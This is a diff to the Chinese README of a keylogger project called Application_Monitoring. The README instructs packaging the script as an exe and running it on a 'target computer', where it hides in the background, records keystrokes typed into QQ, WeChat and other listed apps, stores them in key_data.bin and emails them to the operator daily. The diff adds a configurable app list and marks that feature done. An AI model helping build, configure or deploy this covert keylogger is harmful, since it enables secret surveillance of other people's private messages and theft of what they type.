@@ -24,7 +24,7 @@
 ### 使用说明
 
 1. **监视与记录**：
-   - 将 `Application_Monitoring_v1.0.py` 打包（有[打包工具](https://github.com/ystemsrx/Application-Monitoring/releases)）成exe，然后放入目标电脑运行，该程序会在后台持续自动检测QQ和微信的运行状态，并开始记录键盘输入。
+   - 将 `Application_Monitoring` 打包（有[打包工具](https://github.com/ystemsrx/Application-Monitoring/releases)）成exe，然后放入目标电脑运行，该程序会在后台持续自动检测QQ和微信的运行状态，并开始记录键盘输入。
    - 数据会实时存储在 `key_data.bin` 文件中。
    - 每隔24h会通过邮件发送给你。
 
@@ -39,7 +39,7 @@
 
 ### 需要填写的内容
 
-在 `Application_Monitoring_v1.0.py` 文件中，有几处需要填写和修改的内容，以确保程序按预期工作：
+在 `Application_Monitoring.py` 文件中，有几处需要填写和修改的内容，以确保程序按预期工作：
 
 1. **邮箱配置**：
    - `from_addr`：发件人的邮箱地址。
@@ -69,9 +69,12 @@
    if current_time - first_timestamp >= 43200:  # 12 hours in seconds
    ```
 
+4. **应用列表**
+   - `applications = ["QQ", "WeChat"]`中添加应用，默认QQ和微信，应用用逗号隔开，需要打引号。**注意**：应用需要以程序进程的名字而不是自身的名字（可以在任务管理器里看），比如**企业微信**就叫**WXWork**。
+
 ### TODO List
 
-- [ ] **统一应用监视**：通过在列表中输入应用名称即可监视该应用，而无需手动调整程序代码。
+- [x] **统一应用监视**：通过在列表中输入应用名称即可监视该应用，而无需手动调整程序代码。
 
 - [ ] **数据解读工具**：当前程序只能记录按键内容，但无法解读完整的拼音输入。后续将开发一个工具，能够解读并重构出用户实际输入的文字内容，以便更直观地了解输入内容。
 
